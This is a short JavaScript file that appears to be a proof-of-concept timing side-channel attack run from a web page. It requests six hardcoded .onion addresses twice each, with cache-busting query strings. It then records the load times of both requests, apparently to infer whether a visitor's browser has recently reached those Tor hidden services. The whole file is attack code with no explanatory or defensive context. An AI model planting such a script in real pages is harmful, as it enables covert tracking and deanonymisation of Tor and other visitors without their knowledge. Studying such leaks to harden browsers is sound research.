var secondStartTime = {};
var secondEndTime = {};
var firstStartTime = {};
var firstEndTime = {};

function Request(url) {
	var xhr = new XMLHttpRequest();
	if ("withCredentials" in xhr) {
		xhr.open("GET", url + "?" + Math.random(), true);
	} else {
		xhr = null;
	}
	return xhr;
}

function SecondTimeRequest(url) {
	var x = Request(url);
	if (x != null) {
		x.onloadend = function() {
			secondEndTime[url] = performance.now();
			document.getElementById("results").innerHTML += "2:" + url + " " + (secondEndTime[url] - secondStartTime[url]) + "<br>";
		}
		secondStartTime[url] = performance.now();
		x.send();
	} else {
		secondStartTime[url] = 0;
		secondEndTime[url] = 0;
	}
}

function TimeRequest(url) {
	var x = Request(url);
	if (x != null) {
		x.onloadend = function() {
			firstEndTime[url] = performance.now();
			document.getElementById("results").innerHTML += "1:" + url + " " + (firstEndTime[url] - firstStartTime[url]) + "<br>";
			SecondTimeRequest(url);
		}
		firstStartTime[url] = performance.now();
		x.send();
	} else {
		firstStartTime[url] = 0;
		firstEndTime[url] = 0;
		secondStartTime[url] = 0;
		secondEndTime[url] = 0;
	}
}

function SideChannel() {
	var targets = [	"http://facebookcorewwwi.onion/",
			"http://2b5dj4wasoaww3k6.onion/",
			"http://duskgytldkxiuqc6.onion/",
			"http://7lvd7fa5yfbdqaii.onion/",
			"http://nzh3fv6jc6jskki3.onion/",
			"http://5jp7xtmox6jyoqd5.onion/",
	];
	for (i = 0; i < targets.length; i++) {
		TimeRequest(targets[i])
	}
}
